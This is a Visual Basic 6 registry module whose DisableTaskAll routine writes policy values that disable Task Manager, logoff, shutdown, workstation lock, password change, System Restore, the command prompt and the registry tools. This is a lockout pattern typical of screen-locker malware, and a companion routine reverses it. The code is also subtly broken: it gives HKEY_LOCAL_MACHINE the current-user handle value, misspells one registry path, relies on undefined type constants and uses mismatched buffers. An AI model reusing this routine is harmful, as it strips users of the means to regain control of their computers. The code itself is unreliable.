Attribute VB_Name = "Module4"
Public Const HKEY_CURRENT_USER = &H80000001
Public Const HKEY_LOCAL_MACHINE = &H80000001
Public Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
Public Declare Function RegCreateKey Lib "advapi32.dll" Alias "RegCreateKeyA" (ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long
Public Declare Function RegDeleteValue Lib "advapi32.dll" Alias "RegDeleteValueA" (ByVal hKey As Long, ByVal lpValueName As String) As Long
Public Declare Function RegOpenKey Lib "advapi32.dll" Alias "RegOpenKeyA" (ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long
Public Declare Function RegQueryValueEx Lib "advapi32.dll" Alias "RegQueryValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, lpType As Long, lpData As Any, lpcbData As Long) As Long
Public Declare Function RegSetValueEx Lib "advapi32.dll" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, lpData As Any, ByVal cbData As Long) As Long
Public Const SWP_HIDEWINDOW = &H80
Public Const SWP_SHOWWINDOW = &H40

Public Sub SaveStringWORD(hKey As Long, strPath As String, strValue As String, strData As String)
    Dim Ret
    RegCreateKey hKey, strPath, Ret
    RegSetValueEx Ret, strValue, 0, REG_DWORD, CLng(strData), 4
    RegCloseKey Ret
End Sub

Public Sub EnableTaskAll()
  SaveStringWORD HKEY_CURRENT_USER, "software\microsoft\windows\currentversion\policies\system", "DisableTaskMgr", 0
  SaveStringWORD HKEY_CURRENT_USER, "software\microsoft\windows\currentversion\policies\Explorer", "NoLogoff", 0
  SaveStringWORD HKEY_CURRENT_USER, "software\microsoft\windows\currentversion\policies\Explorer", "NoClose", 0
  SaveStringWORD HKEY_CURRENT_USER, "software\microsoft\windows\currentversion\policies\system", "DisableLockWorkstation", 0
  SaveStringWORD HKEY_CURRENT_USER, "software\microsoft\windows\currentversion\policies\system", "DisableChangePassword", 0
  SaveStringWORD HKEY_CURRENT_USER, "Software\Microsoft\Windows NT\CurrentVersion\SystemRestore", "DisableSR", 0
  SaveStringWORD HKEY_LOCAL_MACHINE, "software\Microsoft\Windows NT\CurrentVersion\SystemRestore", "DisableSR", 0
  SaveStringWORD HKEY_CURRENT_USER, "Software\Policies\Microsoft\Windows\System", "DisableCMD", 0
  SaveStringWORD HKEY_CURRENT_USER, "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", 0
End Sub

Public Sub DisableTaskAll()
    SaveStringWORD HKEY_CURRENT_USER, "software\microsoft\windows\currentversion\policies\system", "DisableTaskMgr", 1
    SaveStringWORD HKEY_CURRENT_USER, "software\microsoft\windows\currentversion\policies\Explorer", "NoLogoff", 1
    SaveStringWORD HKEY_CURRENT_USER, "software\microsoft\windows\currentversion\policies\Explorer", "NoClose", 1
    SaveStringWORD HKEY_CURRENT_USER, "software\microsoft\windows\currentversion\policies\system", "DisableLockWorkstation", 1
    SaveStringWORD HKEY_CURRENT_USER, "software\microsoft\windows\currentversion\policies\system", "DisableChangePassword", 1
    SaveStringWORD HKEY_CURRENT_USER, "Software\Microsoft\Windows NT\CurrentVersion\SystemRestore", "DisableSR", 1
    SaveStringWORD HKEY_LOCAL_MACHINE, "software\Microsoft\Windows NT\CurrentVersion\SystemRestore", "DisableSR", 1
    SaveStringWORD HKEY_CURRENT_USER, "Software\Policies\Microsoft\Windows\System", "DisableCMD", 1
    SaveStringWORD HKEY_CURRENT_USER, "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", 1
   End Sub

Public Sub CheckIfEnable()
    Dim a, B, c, d, e, G, F, Y, T As String
    On Error Resume Next
    a = GetString(HKEY_CURRENT_USER, "software\microsoft\windows\currentversion\policies\system", "DisableTaskMgr")
    B = GetString(HKEY_CURRENT_USER, "sof tware\microsoft\windows\currentversion\policies\Explorer", "NoLogoff")
    c = GetString(HKEY_CURRENT_USER, "software\microsoft\windows\currentversion\policies\Explorer", "NoClose")
    d = GetString(HKEY_CURRENT_USER, "software\microsoft\windows\currentversion\policies\system", "DisableLockWorkstation")
    e = GetString(HKEY_CURRENT_USER, "software\microsoft\windows\currentversion\policies\system", "DisableChangePassword")
    G = GetString(HKEY_LOCAL_MACHINE, "software\Microsoft\Windows NT\CurrentVersion\SystemRestore", "DisableSR")
    T = GetString(HKEY_CURRENT_USER, "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools")
    Y = GetString(HKEY_CURRENT_USER, "Software\Policies\Microsoft\Windows\System", "DisableCMD")
End Sub


Public Function GetString(hKey As Long, strPath As String, strValue As String)
    Dim Ret
    RegOpenKey hKey, strPath, Ret
    GetString = RegQueryStringValue(Ret, strValue)
    RegCloseKey Ret
End Function

Public Function RegQueryStringValue(ByVal hKey As Long, ByVal strValueName As String) As String
    Dim lResult As Long, lValueType As Long, strBuf As String, lDataBufSize As Long
    lResult = RegQueryValueEx(hKey, strValueName, 0, lValueType, ByVal 0, lDataBufSize)
    If lResult = 0 Then
    If lValueType = REG_SZ Then
    strBuf = String(lDataBufSize, Chr$(0))
    lResult = RegQueryValueEx(hKey, strValueName, 0, 0, ByVal strBuf, lDataBufSize)
    If lResult = 0 Then
    RegQueryStringValue = Left$(strBuf, InStr(1, strBuf, Chr$(0)) - 1)
    End If
    ElseIf lValueType = REG_BINARY Then
    Dim strData As Integer
    lResult = RegQueryValueEx(hKey, strValueName, 0, 0, strData, lDataBufSize)
    If lResult = 0 Then
    RegQueryStringValue = strData
    End If
    ElseIf lValueType = REG_DWORD Then
    lResult = RegQueryValueEx(hKey, strValueName, 0, 0, strData, lDataBufSize)
    If lResult = 0 Then
    RegQueryStringValue = strData
    End If
    End If
    End If
End Function
